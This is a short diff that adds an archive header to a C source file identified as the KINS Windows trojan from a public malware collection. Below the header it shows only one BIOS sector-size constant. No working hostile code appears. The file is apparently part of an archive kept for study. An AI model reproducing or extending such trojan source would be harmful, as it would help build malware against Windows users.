@@ -1,3 +1,14 @@
+/*
+  name      KINS
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     —
+ */
 
 // BIOS constants
 #define		BIOS_DEFAULT_SECTOR_SIZE			0x200		// 512 bytes
